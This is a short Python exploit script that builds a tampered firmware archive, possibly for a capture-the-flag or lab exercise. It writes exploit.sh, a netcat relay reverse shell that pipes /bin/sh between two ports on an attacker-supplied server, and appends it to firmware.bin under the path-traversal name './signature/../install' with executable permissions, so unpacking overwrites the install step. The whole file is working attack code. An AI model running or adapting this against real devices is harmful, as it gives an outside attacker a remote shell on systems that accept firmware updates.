import os
import tarfile
EXPLOIT = "exploit.sh"
SERVER = os.environ['SERVER']

def change_bit(info):
    info.mode = int('0100775', 8)
    return info

with open(EXPLOIT, "w") as f:
    f.write("#!/bin/bash\n")
    f.write("nc %s 8080|/bin/sh|nc %s 8081" % (SERVER, SERVER))

os.system("cp ../firmware.bin ./firmware.bin")
tar = tarfile.open("firmware.bin", "a")
for name in ["exploit.sh"]:
    tar.add(name, arcname="./signature/../install", filter=change_bit)
tar.close()
